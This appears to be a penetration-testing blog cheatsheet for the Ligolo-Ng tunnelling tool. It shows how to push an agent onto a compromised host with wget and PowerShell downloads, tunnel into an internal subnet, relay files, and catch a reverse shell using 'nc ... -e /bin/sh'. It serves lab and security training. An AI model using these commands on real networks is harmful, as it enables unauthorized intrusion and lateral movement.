---
layout: post
title:  Ligolo-Ng Cheatsheet
description: Cheatsheet for Ligolo-Ng
date:   2024-10-31 09:00:00 +0300
image:  '/images/21.jpg'
tags:   [Cheatsheets, Tools, Pivoting]
---
# Getting Ligolo-Ng
Important Note: Make sure you are always using the same version of Proxy and Agent (For example, both Proxy and Agent must be 0.7.2).

## Download the binaries manually (recommended)
### PROXY (Run this on Kali)
- [Linux 64-bits Proxy](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz)
- [Windows 64-bits Proxy](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_windows_amd64.zip)

### AGENT (Run this on Pivot Host)
- [Linux 64-bits Agent](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz)
- [Windows 64-bits Agent](https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip)

For more information about Ligolo-Ng, visit its official [GitHub Repository](https://github.com/nicocha30/ligolo-ng).

# Alternative with Package Installer
```shell
sudo apt install ligolo-ng

# Locate, copy the needed files and run them (Example with agent file)
sudo updatedb -v
locate agent
sudo cp /path/to/ligolo/agent .
sudo chmod +x agent
./agent
```

# Basic Pivot
Move the agent file into the pivot host:
```shell
# On Kali
sudo cp /home/kali/Downloads/ligolo-ng_agent_0.7.2_linux_amd64/agent .
python3 -m http.server 443

# On Target (Linux)
cd /tmp
wget http://<kali_ip>:443/agent

# On Target (Windows using PowerShell)
cd C:\Windows\Temp
powershell -c iwr http://<kali_ip>:443/agent.exe -OutFile agent.exe
```
Set up Ligolo-Ng on Kali:
```shell
# Create an interface
sudo ip tuntap add user Vorkharium mode tun ligolo
sudo ip link set ligolo up

# Add new IP range we want to access (Examine Pivot Host with ifconfig, ip a, etc commands)
sudo ip route add 172.16.150.0/24 dev ligolo
ip route list

# Run the proxy file
sudo chmod +x proxy
./proxy -selfcert

# The Ligolo-Ng console will now open (We will interact with it soon)
```

On the Pivot target, use the agent file to connect to our running proxy:
```shell
# On Linux
chmod +x agent
./agent --connect <kali_ip>:11601 -ignore-cert

# On Windows PowerShell
./agent.exe --connect <kali_ip>:11601 -ignore-cert

```

Now enter the following on the Ligolo-Ng console:
```shell
# Enter "session" to show the available sessions
ligolo-ng » session

# Enter "1" to select the session we created when using the agent (There is only one session to choose in this case)
? Specify a session : 1

# Enter "start" to start the connection
[Agent : hackme@compromisedmachine] » start

# Now we are able to access the network 172.16.150.0/24
```

## File Transfer Example with Single Pivot
In this example:
- We got access into the Host B 172.16.150.20 (We are inside its CLI).
- We previously set up our Pivot Host A, in this case 172.16.150.10.
- Now we want to move a file from Kali (192.168.45.200) to Host B (172.16.150.20) through our Pivot Host A (172.16.150.10).

To achieve that, we will create a new listener in our active Ligolo-Ng session:
```shell
# Create new listener - Port 1234 on Kali will be the Port 9001 on the Pivot Host A
# Enter the following on the running active Kali Ligolo-Ng session
listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:9001

# Start Python server on Kali using Port 1234
python3 -m http.server 1234

# From the Host B CLI, access Python server through Port 9003 at the Pivot Host
wget http://172.16.150.10:9001/test.txt
```

## Reverse Shell Example with Single Pivot
Following the example above, we will create a new listener, but this time we will use that listener to get a Reverse Shell:
```shell
# Create new listener - Port 1235 on Kali will be the Port 9002 on the Pivot Host A
# Enter the following on the running active Kali Ligolo-Ng session
listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:9002

# Start nc listener on Kali Port 1235
nc -lvnp 1235

# Enter the following at Linux CLI on Host B to access the nc listener through Pivot Host A Port 9002
nc 172.16.150.10 9002 -e /bin/sh

# Now we successfully got a shell from the Host B (172.16.50.20) to our Kali
```
